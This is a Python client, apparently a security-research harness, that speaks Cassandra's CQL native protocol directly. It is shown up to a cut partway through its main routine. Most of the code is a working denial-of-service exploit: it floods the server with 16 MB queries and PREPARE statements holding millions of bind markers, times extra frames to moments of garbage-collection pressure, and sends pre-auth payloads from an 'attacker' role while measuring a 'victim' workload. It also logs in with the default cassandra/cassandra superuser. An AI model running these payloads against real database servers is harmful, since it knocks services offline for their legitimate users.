#!/usr/bin/env python3
"""3-b R15-B confirm client (2026-11-24, pc82): R20's 3-b client with --prefix (the M payload's table), a
PREPARE/EXECUTE helper and an R15-B shakedown (--shake). R20 client (from R15's client.py, 2026-11-21: wave-2 pre-sent trigger connections --trig2-n/--trig2-at/
--trig2-presend-s, the sat: rule, N = 0 (idle) load, hold from t_trig1 or t_trig2; case file section 2.5).
R15 client (from U6's client.py, 2026-11-20: keyspace r15, CM length 16,777,202, trigger connections):
U6 client: raw CQL native protocol v4 (unsegmented frames), standard library only. Frame I/O adapted from B11/B14.

  client.py --ddl                       create keyspace r15 and table r15.t (k int PRIMARY KEY, v int)
  client.py --sizes                     print query/body/frame sizes of every payload at the default length
  client.py --payload {H,C,M,CM} --n N --hold-s S --out DIR [--len L] [--count K] [--tag p0]

Payloads (case file section 2.4/2.5):
  H   QUERY of '#' x L (L = 16,777,200 by default; v4 body 16,777,207 B, frame 16,777,216 B)
  C   QUERY of '-- ' + '#' x (L - 4) + '\\n' (same L bytes, one COMMENT token)
  M   PREPARE of 'SELECT v FROM u6.t WHERE k IN (' + '?,' x (M - 1) + '?)', M = (L_M - len(prefix)) // 2,
      L_M = 16,777,203 by default (body = 4 + query <= 16,777,207)
  CM  PREPARE of '-- ' + '#' x (L_M - 4) + '\\n'
All connections from 127.0.0.1 (one client IP) to 127.0.0.1:9042. Each connection: STARTUP -> READY -> closed loop with
one request outstanding until the hold ends (or K responses with --count). The frame is built once per process.
Logs: DIR/completions-<tag>.txt (t_ms conn latency_ms opcode code first-120-chars-of-message, spaces as '_') and
DIR/client-<tag>.txt (per second: t_ms open established outstanding completed errors K_client).
"""
import argparse, os, re, socket, struct, sys, threading, time

HOST, PORT = '127.0.0.1', 9042
OP_ERROR, OP_STARTUP, OP_READY, OP_QUERY, OP_RESULT, OP_PREPARE = 0x00, 0x01, 0x02, 0x07, 0x08, 0x09
L_DEFAULT = 16_777_200
LM_DEFAULT = 16_777_203
PREFIX_M = 'SELECT v FROM r15.t WHERE k IN ('
CM_DEFAULT = 16_777_202   # R15 section 2.8: CM has the same query bytes as M (16,777,202)


def frame(op, body, stream=0):
    return struct.pack('>BBhBi', 0x04, 0, stream, op, len(body)) + body


def lstr_b(b):
    return struct.pack('>i', len(b)) + b


def sstr(s):
    b = s.encode(); return struct.pack('>H', len(b)) + b


def recvn(sock, n):
    buf = bytearray(n); mv = memoryview(buf); got = 0
    while got < n:
        r = sock.recv_into(mv[got:], n - got)
        if r == 0:
            raise ConnectionError('closed')
        got += r
    return bytes(buf)


def err_text(body):
    code = struct.unpack_from('>i', body)[0]; l = struct.unpack_from('>H', body, 4)[0]
    return code, body[6:6 + l].decode('utf-8', 'replace')


OP_AUTHENTICATE, OP_AUTH_RESPONSE, OP_AUTH_SUCCESS = 0x03, 0x0F, 0x10
PFX = {'m': 'SELECT v FROM r15.t WHERE k IN ('}   # 3-b R15-B: --prefix
AUTH = {'user': None, 'password': None}   # 3-b R20: set by --user/--password (PasswordAuthenticator, SASL PLAIN)


class Conn:
    """3-b R20: STARTUP, then (PasswordAuthenticator) AUTHENTICATE -> AUTH_RESPONSE(PLAIN) -> AUTH_SUCCESS.
    user=False: stop after AUTHENTICATE (an unauthenticated connection, for the pre-auth check)."""
    def __init__(self, timeout=60, user=None, password=None, src='127.0.0.1'):
        user = AUTH['user'] if user is None else user
        password = AUTH['password'] if password is None else password
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.bind((src, 0))
        s.settimeout(timeout)
        s.connect((HOST, PORT))
        self.s = s; self.authenticated = False
        s.sendall(frame(OP_STARTUP, struct.pack('>H', 1) + sstr('CQL_VERSION') + sstr('3.0.0')))
        op, b = self.recv()
        if op == OP_AUTHENTICATE:
            if user is False:
                return
            if not user:
                raise RuntimeError('server asks for authentication; no --user')
            tok = b'\0' + user.encode() + b'\0' + password.encode()
            s.sendall(frame(OP_AUTH_RESPONSE, lstr_b(tok)))
            op, b = self.recv()
            if op != OP_AUTH_SUCCESS:
                raise RuntimeError('auth: op %d %s' % (op, err_text(b) if op == 0 else ''))
            self.authenticated = True
        elif op != OP_READY:
            raise RuntimeError('startup: op %d %s' % (op, err_text(b) if op == 0 else ''))

    def recv(self):
        h = recvn(self.s, 9)
        ver, fl, st, op, ln = struct.unpack('>BBhBi', h)
        b = recvn(self.s, ln) if ln else b''
        if fl & 0x02: b = b[16:]
        if fl & 0x08:
            n = struct.unpack_from('>H', b)[0]; p = 2
            for _ in range(n):
                l = struct.unpack_from('>H', b, p)[0]; p += 2 + l
            b = b[p:]
        return op, b

    def query(self, q):
        self.s.sendall(frame(OP_QUERY, lstr_b(q.encode()) + struct.pack('>HB', 1, 0)))
        op, b = self.recv()
        if op == OP_ERROR:
            raise RuntimeError('%x %s' % err_text(b))
        return b

    def prepare_raw(self, q):
        """3-b R15-B: PREPARE (v4 body = [long string]) -> (op, body) without raising"""
        self.s.sendall(frame(OP_PREPARE, lstr_b(q if isinstance(q, bytes) else q.encode())))
        return self.recv()

    def execute_raw(self, sid, values):
        """3-b R15-B: EXECUTE <id> at CL ONE with int values -> (op, body)"""
        body = struct.pack('>H', len(sid)) + sid + struct.pack('>HB', 1, 0x01 if values else 0)
        if values:
            body += struct.pack('>H', len(values)) + b''.join(struct.pack('>i', 4) + struct.pack('>i', v) for v in values)
        self.s.sendall(frame(0x0A, body))
        return self.recv()

    def query_raw(self, q):
        """-> (op, body) without raising (3-b checks)"""
        self.s.sendall(frame(OP_QUERY, lstr_b(q if isinstance(q, bytes) else q.encode()) + struct.pack('>HB', 1, 0)))
        return self.recv()


def _opt(b, p):
    t = struct.unpack_from('>H', b, p)[0]; p += 2
    if t == 0x0000:
        l = struct.unpack_from('>H', b, p)[0]; return ('custom', b[p + 2:p + 2 + l].decode()), p + 2 + l
    if t in (0x0020, 0x0022):
        sub, p = _opt(b, p); return (t, sub), p
    if t == 0x0021:
        k, p = _opt(b, p); v, p = _opt(b, p); return (t, k, v), p
    return t, p


def _val(t, v):
    if v is None: return 'null'
    if t in (0x0001, 0x000D): return v.decode('utf-8', 'replace')
    if t == 0x0004: return str(bool(v[0]))
    if t == 0x0009: return str(struct.unpack('>i', v)[0])
    if isinstance(t, tuple) and t[0] in (0x0020, 0x0022, 0x0021):
        n = struct.unpack_from('>i', v)[0]; p = 4; out = []
        for _ in range(n):
            items = []
            for sub in (t[1:] if t[0] == 0x0021 else (t[1],)):
                l = struct.unpack_from('>i', v, p)[0]; p += 4; items.append(_val(sub, v[p:p + l] if l >= 0 else None)); p += max(l, 0)
            out.append(':'.join(items))
        return '{' + ','.join(out) + '}'
    return v.hex()


def rows(body):
    """decode a RESULT Rows body -> (column names, list of rows of strings); other kinds -> (None, kind)"""
    kind = struct.unpack_from('>i', body)[0]
    if kind != 2: return None, kind
    flags, nc = struct.unpack_from('>ii', body, 4); p = 12
    if flags & 0x0002:
        l = struct.unpack_from('>i', body, p)[0]; p += 4 + max(l, 0)
    glob_spec = flags & 0x0001
    if glob_spec:
        for _ in range(2):
            l = struct.unpack_from('>H', body, p)[0]; p += 2 + l
    cols = []
    for _ in range(nc):
        if not glob_spec:
            for _ in range(2):
                l = struct.unpack_from('>H', body, p)[0]; p += 2 + l
        l = struct.unpack_from('>H', body, p)[0]; name = body[p + 2:p + 2 + l].decode(); p += 2 + l
        t, p = _opt(body, p); cols.append((name, t))
    n = struct.unpack_from('>i', body, p)[0]; p += 4; out = []
    for _ in range(n):
        r = []
        for name, t in cols:
            l = struct.unpack_from('>i', body, p)[0]; p += 4
            r.append(_val(t, body[p:p + l] if l >= 0 else None)); p += max(l, 0)
        out.append(r)
    return [c[0] for c in cols], out


def payload(p, L=None):
    """-> (opcode, query bytes)"""
    if p == 'H':
        L = L or L_DEFAULT; return OP_QUERY, b'#' * L
    if p == 'C':
        L = L or L_DEFAULT; return OP_QUERY, b'-- ' + b'#' * (L - 4) + b'\n'
    if p == 'M':
        pre = PFX['m']; LM = L or LM_DEFAULT; m = (LM - len(pre)) // 2
        return OP_PREPARE, pre.encode() + b'?,' * (m - 1) + b'?)'
    if p == 'CM':
        LM = L or CM_DEFAULT; return OP_PREPARE, b'-- ' + b'#' * (LM - 4) + b'\n'
    raise ValueError(p)


def build(p, L=None):
    op, q = payload(p, L)
    body = lstr_b(q) + (struct.pack('>HB', 1, 0) if op == OP_QUERY else b'')
    return op, q, frame(op, body), len(body)


class Stats:
    def __init__(self):
        self.lock = threading.Lock(); self.open = 0; self.est = 0; self.out = 0; self.done = 0; self.err = 0
        self.first_send = {}; self.resp = {}; self.tout = 0


def worker(i, fr, st, stop, comp, go, hold, count):
    try:
        with st.lock: st.open += 1
        c = Conn()
        c.s.settimeout(hold + 120)
        with st.lock: st.est += 1
    except Exception as e:
        with st.lock: st.err += 1; st.open -= 1
        comp.write('%d %d -1 connect_error - %s\n' % (time.time() * 1000, i, str(e)[:100].replace(' ', '_')))
        return
    go.wait()
    k = 0
    while not stop.is_set() and (count is None or k < count):
        ts = time.time()
        try:
            with st.lock:
                st.out += 1
                st.first_send.setdefault(i, ts)
            c.s.sendall(fr)
            op, b = c.recv()
        except Exception as e:
            with st.lock: st.out -= 1; st.err += 1
            comp.write('%d %d %d io_error - %s\n' % (time.time() * 1000, i, (time.time() - ts) * 1000,
                                                    str(e)[:100].replace(' ', '_')))
            break
        k += 1
        if op == OP_ERROR:
            code, msg = err_text(b); res = 'ERROR 0x%04x %s' % (code, msg[:120].replace(' ', '_'))
        else:
            res = 'op%d - %s' % (op, b[:4].hex())
        with st.lock:
            st.out -= 1; st.resp[i] = st.resp.get(i, 0) + 1
            if op == OP_ERROR: st.err += 1
            else: st.done += 1
        comp.write('%d %d %d %s\n' % (time.time() * 1000, i, (time.time() - ts) * 1000, res))
    try: c.s.close()
    except Exception: pass


def trig_worker(j, c, fr, st, fire, comp, tlog):
    """R15 trigger connection: already STARTed and idle; sends ONE frame when `fire` is set, waits for the response."""
    fire.wait()
    ts = time.time()
    with st.lock: st.tout += 1
    tlog.write('trig%d send %d\n' % (j, ts * 1000))
    try:
        c.s.sendall(fr)
        op, b = c.recv()
        res = ('ERROR 0x%04x %s' % (err_text(b)[0], err_text(b)[1][:120].replace(' ', '_'))) if op == OP_ERROR else 'op%d' % op
    except Exception as e:
        res = 'io_error - %s' % str(e)[:100].replace(' ', '_')
    with st.lock: st.tout -= 1
    comp.write('%d trig%d %d %s\n' % (time.time() * 1000, j, (time.time() - ts) * 1000, res))
    tlog.write('trig%d response %d latency_ms %d %s\n' % (j, time.time() * 1000, (time.time() - ts) * 1000, res))


def trig2_worker(j, c, fr, st, presend_at, fire, comp, tlog):
    """R20 wave-2 trigger connection: STARTed before load start; at presend_at sends the frame minus its LAST byte,
    waits; when `fire` is set sends the last byte and waits for the response."""
    while time.time() < presend_at:
        time.sleep(0.05)
    ts = time.time()
    try:
        c.s.sendall(fr[:-1])
        tlog.write('trig2-%d presend %d bytes %d done %d\n' % (j, ts * 1000, len(fr) - 1, time.time() * 1000))
    except Exception as e:
        tlog.write('trig2-%d presend_error %d %s\n' % (j, time.time() * 1000, str(e)[:100].replace(' ', '_')))
        comp.write('%d trig2-%d -1 io_error - presend_%s\n' % (time.time() * 1000, j, str(e)[:100].replace(' ', '_')))
        return
    fire.wait()
    ts = time.time()
    with st.lock: st.tout += 1
    tlog.write('trig2-%d send %d (last byte)\n' % (j, ts * 1000))
    try:
        c.s.sendall(fr[-1:])
        op, b = c.recv()
        res = ('ERROR 0x%04x %s' % (err_text(b)[0], err_text(b)[1][:120].replace(' ', '_'))) if op == OP_ERROR else 'op%d' % op
    except Exception as e:
        res = 'io_error - %s' % str(e)[:100].replace(' ', '_')
    with st.lock: st.tout -= 1
    comp.write('%d trig2-%d %d %s\n' % (time.time() * 1000, j, (time.time() - ts) * 1000, res))
    tlog.write('trig2-%d response %d latency_ms %d %s\n' % (j, time.time() * 1000, (time.time() - ts) * 1000, res))


# ---- 3-b R20 additions (2026-11-23): superuser setup, auth shakedown, victim workload ----
ATK_USER, ATK_PW = 'attacker', 'atk-3bR15B'
VIC_USER, VIC_PW = 'victim', 'vic-3bR15B'
SETUP_STMTS = [
    "CREATE ROLE %s WITH PASSWORD = '%s' AND LOGIN = true" % (ATK_USER, ATK_PW),
    "CREATE ROLE %s WITH PASSWORD = '%s' AND LOGIN = true" % (VIC_USER, VIC_PW),
    "CREATE KEYSPACE victim_ks WITH replication = {'class':'SimpleStrategy','replication_factor':1}",
    "CREATE TABLE victim_ks.t (k int PRIMARY KEY, v text)",
    "GRANT SELECT ON TABLE victim_ks.t TO %s" % VIC_USER,
    "GRANT MODIFY ON TABLE victim_ks.t TO %s" % VIC_USER,
]
LIST_STMTS = ["LIST ROLES", "LIST ALL PERMISSIONS OF %s" % ATK_USER, "LIST ALL PERMISSIONS OF %s" % VIC_USER,
              "LIST ALL PERMISSIONS"]


def show(c, q, out):
    op, b = c.query_raw(q)
    if op == OP_ERROR:
        out.write('%s\n  -> ERROR 0x%04x %s\n' % (q, *err_text(b))); return
    cols, r = rows(b)
    if cols is None:
        out.write('%s\n  -> RESULT kind %s\n' % (q, r)); return
    out.write('%s\n  -> %s\n' % (q, ' | '.join(cols)))
    for row in r: out.write('     %s\n' % ' | '.join(row))


def do_setup(out):
    """superuser (default cassandra/cassandra, created ~10 s after start) creates the two roles, the victim's keyspace
    and table, and the victim's grants; the attacker gets LOGIN only (no GRANT)."""
    dl = time.time() + 120; c = None; last = ''
    while time.time() < dl:
        try:
            c = Conn(user='cassandra', password='cassandra'); break
        except Exception as e:
            last = str(e)[:200]; time.sleep(2)
    if c is None:
        out.write('superuser login failed: %s\n' % last); return 1
    out.write('# superuser cassandra logged in at %d\n' % (time.time() * 1000))
    for q in SETUP_STMTS:
        op, b = c.query_raw(q)
        out.write('%s -> %s\n' % (q, ('ERROR 0x%04x %s' % err_text(b)) if op == OP_ERROR else 'ok'))
        if op == OP_ERROR: return 1
    for q in LIST_STMTS: show(c, q, out)
    c.s.close(); return 0


def timed(c, q):
    t = time.time(); op, b = c.query_raw(q); dt = time.time() - t
    return dt, (('ERROR 0x%04x %s' % err_text(b))[:200] if op == OP_ERROR else 'op%d' % op)


def do_shake(out, L):
    """3-b R15-B auth checks (no attack): authorizer enforcing for the attacker; PREPARE without permission (small
    statement on victim_ks.t, then EXECUTE); payload M at L naming the absent r15.t and the victim's victim_ks.t, CM at
    L, as the attacker; M/CM on an unauthenticated connection; wrong password; the victim's own reads/writes."""
    a = Conn(user=ATK_USER, password=ATK_PW, timeout=120)
    out.write('attacker login: authenticated=%s\n' % a.authenticated)
    for q in ("SELECT * FROM victim_ks.t", "INSERT INTO victim_ks.t (k, v) VALUES (1, 'x')",
              "CREATE KEYSPACE atk_ks WITH replication = {'class':'SimpleStrategy','replication_factor':1}",
              "SELECT * FROM system_auth.roles"):
        dt, r = timed(a, q); out.write('attacker QUERY %s -> %s (%.0f ms)\n' % (q, r, dt * 1000))
    show(a, "LIST ALL PERMISSIONS OF %s" % ATK_USER, out)
    # PREPARE of a small statement on a table the attacker may not read, then EXECUTE it
    q = "SELECT v FROM victim_ks.t WHERE k = ?"
    t = time.time(); op, b = a.prepare_raw(q); dt = time.time() - t
    if op == OP_ERROR:
        out.write('attacker PREPARE %s -> ERROR 0x%04x %s (%.0f ms)\n' % (q, *err_text(b), dt * 1000))
    else:
        kind = struct.unpack_from('>i', b)[0]; n = struct.unpack_from('>H', b, 4)[0]; sid = b[6:6 + n]
        out.write('attacker PREPARE %s -> RESULT kind %d (Prepared) id %s (%.0f ms)\n' % (q, kind, sid.hex(), dt * 1000))
        t = time.time(); op, b = a.execute_raw(sid, [1]); dt = time.time() - t
        out.write('attacker EXECUTE %s (k=1) -> %s (%.0f ms)\n' % (sid.hex(), ('ERROR 0x%04x %s' % err_text(b)) if op == OP_ERROR else 'op%d' % op, dt * 1000))
    for pfx, p in (('SELECT v FROM r15.t WHERE k IN (', 'M'), ('SELECT v FROM r15.t WHERE k IN (', 'M'),
                   ('SELECT v FROM victim_ks.t WHERE k IN (', 'M'), (None, 'CM'), (None, 'CM')):
        if pfx: PFX['m'] = pfx
        _, q = payload(p, L)
        t = time.time(); op, b = a.prepare_raw(q); dt = time.time() - t
        r = ('ERROR 0x%04x %s' % err_text(b))[:160] if op == OP_ERROR else 'op%d' % op
        out.write('attacker PREPARE %s len %d markers %d (%s) -> %s (%.3f s)\n' % (p, len(q), q.count(b'?'), (pfx or '-').strip(), r, dt))
    PFX['m'] = 'SELECT v FROM r15.t WHERE k IN ('
    a.s.close()
    # unauthenticated connection: STARTUP answered AUTHENTICATE; then PREPAREs (CM, M at L) without AUTH_RESPONSE
    u = Conn(user=False, timeout=60)
    out.write('unauthenticated conn: authenticated=%s\n' % u.authenticated)
    for p in ('CM', 'M', 'M'):
        _, q = payload(p, L)
        try:
            t = time.time(); op, b = u.prepare_raw(q); dt = time.time() - t
            r = ('ERROR 0x%04x %s' % err_text(b))[:160] if op == OP_ERROR else 'op%d' % op
            out.write('unauth PREPARE %s len %d -> %s (%.3f s)\n' % (p, len(q), r, dt))
        except Exception as e:
            out.write('unauth PREPARE %s -> io %s\n' % (p, str(e)[:100])); break
    try: u.s.close()
    except Exception: pass
    try:
        Conn(user=ATK_USER, password='wrong'); out.write('wrong password: accepted (!)\n')
    except Exception as e:
        out.write('wrong password -> %s\n' % str(e)[:160])
    v = Conn(user=VIC_USER, password=VIC_PW, src='127.0.0.2')
    for q in ("INSERT INTO victim_ks.t (k, v) VALUES (1, 'v1')", "SELECT v FROM victim_ks.t WHERE k = 1"):
        dt, r = timed(v, q); out.write('victim %s -> %s (%.1f ms)\n' % (q, r, dt * 1000))
    v.s.close(); return 0


def do_victim(out_dir, rate, stopfile, req_timeout=5.0):
    """steady light workload as role victim from source IP 127.0.0.2: alternating INSERT / SELECT by key (1,000 keys),
    CL ONE, one connection, one request at a time at `rate` slots per second; a slot that cannot start on time
    (previous request still out) is 'missed'. Timeout or I/O error -> close and reconnect on the next slot.
    victim.txt per second: epoch_s slots ok err timeout connfail missed p50_ms p99_ms max_ms;
    victim-events.txt: errors and state changes."""
    vt = open(os.path.join(out_dir, 'victim.txt'), 'a', buffering=1)
    ev = open(os.path.join(out_dir, 'victim-events.txt'), 'a', buffering=1)
    vt.write('# victim start %d rate %.1f/s timeout %.1f s src 127.0.0.2 role %s\n' % (time.time() * 1000, rate, req_timeout, VIC_USER))
    vt.write('# epoch_s slots ok err timeout connfail missed p50_ms p99_ms max_ms\n')
    iv = 1.0 / rate; nxt = time.time(); c = None; i = 0
    cur = int(nxt); b = dict(slots=0, ok=0, err=0, timeout=0, connfail=0, missed=0, lat=[]); state = None

    def flush(sec):
        l = sorted(b['lat']); n = len(l)
        p = lambda q: ('%.1f' % l[min(n - 1, int(q * n))]) if n else '-'
        vt.write('%d %d %d %d %d %d %d %s %s %s\n' % (sec, b['slots'], b['ok'], b['err'], b['timeout'], b['connfail'],
                                                     b['missed'], p(0.5), p(0.99), ('%.1f' % l[-1]) if n else '-'))
        for k in b: b[k] = [] if k == 'lat' else 0

    def note(st, msg):
        nonlocal state
        if st != state:
            ev.write('%d %s %s\n' % (time.time() * 1000, st, msg[:200])); state = st
    while not os.path.exists(stopfile):
        now = time.time()
        if now < nxt:
            time.sleep(nxt - now); now = time.time()
        sec = int(now)
        while cur < sec:
            flush(cur); cur += 1
        if now - nxt > iv:   # behind: count the slots that could not start
            m = int((now - nxt) / iv); b['missed'] += m; nxt += m * iv
        b['slots'] += 1; nxt += iv; i += 1
        if c is None:
            try:
                c = Conn(user=VIC_USER, password=VIC_PW, src='127.0.0.2', timeout=req_timeout)
                note('connected', '')
            except Exception as e:
                b['connfail'] += 1; c = None; note('connfail', str(e)); continue
        k = (i // 2) % 1000
        q = ("INSERT INTO victim_ks.t (k, v) VALUES (%d, 'value-%d')" % (k, i)) if i % 2 == 0 else ("SELECT v FROM victim_ks.t WHERE k = %d" % k)
        t = time.time()
        try:
            op, body = c.query_raw(q)
        except socket.timeout:
            b['timeout'] += 1; note('timeout', q); c.s.close(); c = None; continue
        except Exception as e:
            b['connfail'] += 1; note('ioerror', str(e)); 
            try: c.s.close()
            except Exception: pass
            c = None; continue
        b['lat'].append((time.time() - t) * 1000)
        if op == OP_ERROR:
            b['err'] += 1; note('error', 'ERROR 0x%04x %s' % err_text(body))
        else:
            b['ok'] += 1; note('ok', '')
    flush(cur); vt.write('# victim end %d\n' % (time.time() * 1000)); return 0


FULL = re.compile(r'GC\((\d+)\) Pause Full \(([^)]*)\) (\d+)M->(\d+)M\((\d+)M\) ([\d.]+)ms')


class GcTail:
    """Reads new lines of gc.log (follows rotation by inode/size); returns new 'Pause Full' lines (deduplicated by GC id)."""
    def __init__(self, path):
        self.path = path; self.off = 0; self.ino = None; self.buf = ''; self.seen = set()

    def poll(self):
        out = []
        try:
            stt = os.stat(self.path)
        except OSError:
            return out
        if self.ino != stt.st_ino or stt.st_size < self.off:
            self.ino = stt.st_ino; self.off = 0; self.buf = ''
        with open(self.path, errors='replace') as f:
            f.seek(self.off); data = f.read(); self.off = f.tell()
        self.buf += data
        lines = self.buf.split('\n'); self.buf = lines.pop()
        for l in lines:
            m = FULL.search(l)
            if m and int(m.group(1)) not in self.seen:
                self.seen.add(int(m.group(1))); out.append((int(m.group(4)), l.strip()))
        return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--ddl', action='store_true'); ap.add_argument('--sizes', action='store_true')
    ap.add_argument('--payload', choices=['H', 'C', 'M', 'CM']); ap.add_argument('--n', type=int, default=1)
    ap.add_argument('--hold-s', type=int, default=300, help='hold after the trigger instant (or after load start with --trig-at none)')
    ap.add_argument('--out', default='.')
    ap.add_argument('--len', type=int); ap.add_argument('--count', type=int); ap.add_argument('--tag', default='p0')
    ap.add_argument('--trig-n', type=int, default=0, help='k idle trigger connections, each sends one payload-C QUERY')
    ap.add_argument('--trig-at', default='none', help='none | gc:<gc.log>:<heap MiB> | fixed:<s after load start>')
    ap.add_argument('--trig-max', type=float, default=300.0, help='t_max (s after load start) for the gc: rule')
    ap.add_argument('--min-resp', type=int, default=0, help='extend the hold (<= 300 s) until each load conn has this many responses')
    ap.add_argument('--trig2-n', type=int, default=0, help='R20: k2 wave-2 trigger connections, payload-C frame pre-sent minus its last byte')
    ap.add_argument('--trig2-presend-s', type=float, default=10.0, help='R20: pre-send instant (s after load start)')
    ap.add_argument('--trig2-at', default='none', help='R20: none | sat:<gc.log>:<heap MiB>:<free MiB> | gc:<gc.log>:<heap MiB> | fixed:<s after load start>')
    ap.add_argument('--user'); ap.add_argument('--password')
    ap.add_argument('--setup', action='store_true'); ap.add_argument('--shake', action='store_true')
    ap.add_argument('--victim', action='store_true'); ap.add_argument('--rate', type=float, default=20.0)
    ap.add_argument('--stopfile')
    ap.add_argument('--prefix', help='3-b R15-B: the M payload prefix (default: SELECT v FROM r15.t WHERE k IN ()')
    a = ap.parse_args()
    AUTH['user'] = a.user; AUTH['password'] = a.password
    if a.prefix: PFX['m'] = a.prefix
    if a.setup:
        return do_setup(open(os.path.join(a.out, 'auth-setup.txt'), 'a', buffering=1))
    if a.shake:
        return do_shake(open(os.path.join(a.out, 'auth-shake.txt'), 'a', buffering=1), a.len or 1048576)
    if a.victim:
        return do_victim(a.out, a.rate, a.stopfile)
    if a.ddl:
        c = Conn()
        c.query("CREATE KEYSPACE IF NOT EXISTS r15 WITH replication = {'class':'SimpleStrategy','replication_factor':1}")
        c.query('CREATE TABLE IF NOT EXISTS r15.t (k int PRIMARY KEY, v int)')
        print('ddl ok'); return 0
    if a.sizes:
        for p in ('H', 'C', 'M', 'CM'):
            op, q, fr, bl = build(p, a.len)
            extra = ' markers %d' % q.count(b'?') if p == 'M' else ''
            print('%s op 0x%02x query %d body %d frame %d%s' % (p, op, len(q), bl, len(fr), extra))
        return 0
    os.makedirs(a.out, exist_ok=True)
    comp = open(os.path.join(a.out, 'completions-%s.txt' % a.tag), 'a', buffering=1)
    clog = open(os.path.join(a.out, 'client-%s.txt' % a.tag), 'a', buffering=1)
    tlog = open(os.path.join(a.out, 'trigger.txt'), 'a', buffering=1)
    op, q, fr, B = build(a.payload, a.len)
    st = Stats(); stop = threading.Event(); go = threading.Event(); fire = threading.Event()
    clog.write('# start %s payload=%s n=%d len=%d body=%d frame=%d pid=%d trig_n=%d trig_at=%s trig_max=%.0f hold_after=%d\n' % (
        time.strftime('%Y-%m-%dT%H:%M:%S%z'), a.payload, a.n, len(q), B, len(fr), os.getpid(), a.trig_n, a.trig_at,
        a.trig_max, a.hold_s))
    # trigger connections first (STARTUP done, idle), then the load connections
    tconns = []
    if a.trig_n:
        _, tq, tfr, TB = build('C')
        for j in range(a.trig_n):
            c = Conn(); c.s.settimeout(a.hold_s + 120 + 3600); tconns.append(c)
        tlog.write('# trigger connections %d established at %d; trigger payload C query %d body %d frame %d\n' % (
            len(tconns), time.time() * 1000, len(tq), TB, len(tfr)))
    t2conns = []
    if a.trig2_n:
        _, tq, tfr, TB = build('C')
        for j in range(a.trig2_n):
            c = Conn(); c.s.settimeout(a.hold_s + 120 + 3600 + 600); t2conns.append(c)
        tlog.write('# wave-2 trigger connections %d established at %d; payload C frame %d, pre-sent %d at +%.0f s\n' % (
            len(t2conns), time.time() * 1000, len(tfr), len(tfr) - 1, a.trig2_presend_s))
    threads = [threading.Thread(target=worker, args=(i, fr, st, stop, comp, go, a.hold_s + 3600, a.count), daemon=True)
               for i in range(a.n)]
    for t in threads: t.start()
    dl = time.time() + 60
    while time.time() < dl:
        with st.lock:
            if st.est + st.err >= a.n: break
        time.sleep(0.1)
    clog.write('# established=%d body=%d at %d\n' % (st.est, B, time.time() * 1000))

    def sampler():
        while not stop.is_set():
            with st.lock:
                clog.write('%d %d %d %d %d %d %d %d\n' % (time.time() * 1000, st.open, st.est, st.out, st.done, st.err,
                                                          st.out * B, st.tout))
            time.sleep(1)
    threading.Thread(target=sampler, daemon=True).start()
    go.set()
    dl = time.time() + 30
    while time.time() < dl:
        with st.lock:
            if len(st.first_send) >= st.est: break
        time.sleep(0.01)
    with st.lock: t_load = max(st.first_send.values()) if st.first_send else time.time()
    tlog.write('load_start %d (last of %d load connections sent its first request)\n' % (t_load * 1000, len(st.first_send)))
    tthreads = [threading.Thread(target=trig_worker, args=(j, c, tfr, st, fire, comp, tlog), daemon=True)
                for j, c in enumerate(tconns)]
    for t in tthreads: t.start()
    fire2 = threading.Event()
    t2threads = [threading.Thread(target=trig2_worker, args=(j, c, tfr, st, t_load + a.trig2_presend_s, fire2, comp, tlog),
                                  daemon=True) for j, c in enumerate(t2conns)]
    for t in t2threads: t.start()

    def load_alive():   # R20: an idle run (N = 0) counts as alive
        return a.n == 0 or any(t.is_alive() for t in threads)
    # decide the trigger instant
    rule = a.trig_at; t_det = None; t_trig = None; fired_lines = []
    if rule.startswith('fixed:'):
        t_trig = t_load + float(rule.split(':', 1)[1])
    elif rule.startswith('gc:'):
        path = rule[3:rule.rindex(':')]; heap = float(rule[rule.rindex(':') + 1:])
        gt = GcTail(path); run = []
        t_max = t_load + a.trig_max
        while time.time() < t_max:
            if not load_alive():
                tlog.write('# all load connections ended at %d before the trigger\n' % (time.time() * 1000)); break
            for after, l in gt.poll():
                if after >= 0.95 * heap: run.append(l)
                else: run = []
                if len(run) >= 3 and t_det is None:
                    t_det = time.time(); fired_lines = run[-3:]
            if t_det is not None: break
            time.sleep(0.5)
        if t_det is not None:
            t_trig = min(max(t_det + 30, t_load + 30), t_max)
            tlog.write('t_det %d (+%.1f s after load start); rule: 3 consecutive Pause Full with after >= %.0f MiB\n' % (
                t_det * 1000, t_det - t_load, 0.95 * heap))
            for l in fired_lines: tlog.write('  fired by: %s\n' % l)
        else:
            t_trig = t_max
            tlog.write('undetected by t_max (+%.0f s); firing at t_max\n' % a.trig_max)
    end_base = None
    if t_trig is not None:
        while time.time() < t_trig and load_alive():
            time.sleep(0.2)
        if a.trig_n and load_alive():
            fire.set()
            tlog.write('t_trig %d (+%.1f s after load start) rule %s k=%d\n' % (time.time() * 1000, time.time() - t_load, rule, a.trig_n))
        elif a.trig_n:
            tlog.write('# trigger not sent: load connections ended at %d\n' % (time.time() * 1000))
        else:
            tlog.write('t_trig(no send, k=0) %d (+%.1f s after load start) rule %s\n' % (time.time() * 1000, time.time() - t_load, rule))
        end_base = time.time()
    else:
        end_base = t_load
    # R20 wave 2 (pre-sent triggers): decide t_trig2, then send the last byte of each pre-sent frame
    t_trig1 = end_base if (a.trig_n and t_trig is not None) else None
    if a.trig2_n:
        r2 = a.trig2_at; t_det2 = None; t_trig2 = None; fired2 = []
        if r2.startswith('fixed:'):
            t_trig2 = t_load + float(r2.split(':', 1)[1])
        elif r2.startswith('sat:') or r2.startswith('gc:'):
            parts = r2.split(':'); path = parts[1]; heap = float(parts[2])
            if r2.startswith('sat:'):
                free = float(parts[3]); ok = lambda after: heap - after <= free
                t_from = (t_trig1 + 30) if t_trig1 else t_load
                t_cap = (t_trig1 + 300) if t_trig1 else t_load + a.trig_max
                desc = '3 consecutive Pause Full with heap - after <= %.0f MiB, counted from +%.1f s' % (free, t_from - t_load)
            else:
                ok = lambda after: after >= 0.95 * heap
                t_from = t_load; t_cap = t_load + a.trig_max
                desc = '3 consecutive Pause Full with after >= %.0f MiB' % (0.95 * heap)
            while time.time() < t_from and load_alive():
                time.sleep(0.2)
            gt = GcTail(path); gt.poll()   # discard Full GCs logged before t_from
            run = []
            while time.time() < t_cap:
                if not load_alive():
                    tlog.write('# all load connections ended at %d before wave 2\n' % (time.time() * 1000)); break
                for after, l in gt.poll():
                    if ok(after): run.append(l)
